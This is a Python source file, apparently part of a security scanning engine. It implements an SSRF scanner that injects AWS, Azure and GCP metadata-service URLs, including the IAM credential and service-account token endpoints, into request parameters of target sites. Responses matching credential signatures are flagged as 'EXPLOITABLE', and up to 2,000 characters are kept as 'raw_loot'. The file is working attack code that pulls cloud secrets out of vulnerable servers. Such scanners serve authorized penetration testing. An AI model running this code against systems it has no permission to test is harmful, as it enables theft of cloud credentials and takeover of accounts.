import scan_engine.helpers.http_client as http_client
from scan_engine.helpers.http_client import get_session
import re
from urllib.parse import urlparse, urljoin

class SSRFScanner:
    """
    Expert SSRF Scanner targeting Cloud Metadata Services (IMDS).
    Checks for AWS, Azure, and GCP sensitive metadata leakage.
    """
    def __init__(self, target, options=None):
        self.options = options
        self.target = target
        self.metadata_payloads = {
            "aws": "http://169.254.169.254/latest/meta-data/",
            "aws_iam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "gcp": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        }
        
        # Common vulnerable parameters for SSRF
        self.ssrf_params = [
            'url', 'uri', 'path', 'dest', 'destination', 'redir', 'redirect', 
            'to', 'link', 'callback', 'feed', 'val', 'validate', 'proxy', 'file'
        ]

    def _test_url(self, base_url, param, payload, logger=None):
        """Helper to test a single parameter with a payload."""
        try:
            # We don't want to use requests here for the final check because we want to see 
            # if the target acts as a proxy.
            test_url = f"{base_url}{'&' if '?' in base_url else '?'}{param}={payload}"
            r = http_client.get(test_url, options=getattr(self, "options", None), timeout=5, allow_redirects=True)
            
            # Guard: only match on 200 with text content (avoids WAF/redirect false positives)
            if r.status_code != 200:
                return False, None, None
            ctype = r.headers.get("Content-Type", "")
            if "text" not in ctype and "json" not in ctype:
                return False, None, None

            # Signatures for success
            signatures = [
                "ami-id", "instance-id", "local-hostname",  # AWS
                "AccessKeyId", "SecretAccessKey",           # AWS IAM
                "computeMetadata/v1", "access_token",      # GCP
                "compute", "network", "storage"             # Azure/Generic
            ]
            
            if any(sig in r.text for sig in signatures):
                return True, r.text, test_url
        except Exception:
            pass
        return False, None, None

    def scan_endpoints(self, discovered_urls, logger=None):
        """
        Analyzes discovered URLs for SSRF vulnerabilities targeting Cloud Metadata.
        """
        findings = []
        if not discovered_urls:
            return findings

        if logger: logger(f"SSRF Expert: Probing {len(discovered_urls)} endpoints for Cloud Metadata Leakage...", "INFO")

        tested_bases = set()

        for url in discovered_urls:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            if base in tested_bases: continue
            tested_bases.add(base)

            # Check if URL already has suspicious parameters
            query_params = parsed.query.split('&')
            params_to_test = []
            
            for p_pair in query_params:
                if '=' in p_pair:
                    p_name = p_pair.split('=')[0]
                    if p_name.lower() in self.ssrf_params:
                        params_to_test.append(p_name)
            
            # If no obvious params found, try adding them to the base URL
            if not params_to_test:
                params_to_test = ['url', 'dest'] # Minimal defaults

            for param in params_to_test:
                for cloud, payload in self.metadata_payloads.items():
                    # Extra headers for Azure/GCP if needed (though SSRF usually just sends GET)
                    hit, content, vuln_url = self._test_url(base, param, payload, logger)
                    
                    if hit:
                        severity = "critical"
                        title = f"CRITICAL: SSRF Cloud Metadata Leak ({cloud.upper()})"
                        desc = f"Vulnerable Endpoint: `{vuln_url}`\n\nIdentified a Server-Side Request Forgery vulnerability that allows access to internal Cloud Metadata Services. "
                        
                        if "SecretAccessKey" in content or "access_token" in content:
                            title = f"💣 EXPLOITABLE: SSRF {cloud.upper()} Credentials Leaked"
                            desc += "\n\n**CRITICAL**: Temporary security credentials (tokens/keys) were extracted from the metadata service."
                            
                        findings.append({
                            "title": title,
                            "description": desc + f"\n\nEvidence Snippet:\n```\n{content[:500]}\n```",
                            "severity": severity,
                            "tool_source": "ssrf_expert",
                            "raw_loot": content[:2000],
                            "loot_type": "Cloud Credentials" if "AccessKeyId" in content else "Instance Metadata"
                        })
                        
                        if logger: logger(f"🔥 SSRF BREACH: {cloud.upper()} metadata exposed on {base}", "CRITICAL")
                        break # Found one cloud on this param, move to next param
        
        return findings
